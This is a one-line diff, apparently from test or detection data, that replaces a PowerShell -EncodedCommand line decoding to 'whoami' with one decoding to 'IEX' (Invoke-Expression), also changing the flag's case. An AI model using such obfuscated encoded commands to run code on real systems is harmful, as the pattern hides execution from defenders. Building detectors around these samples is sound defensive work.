@@ -1,1 +1,1 @@
-powershell.exe -EncodedCommand dwBoAG8AYQBtAGkA
+powershell.exe -encodedcommand SQBFAFgA
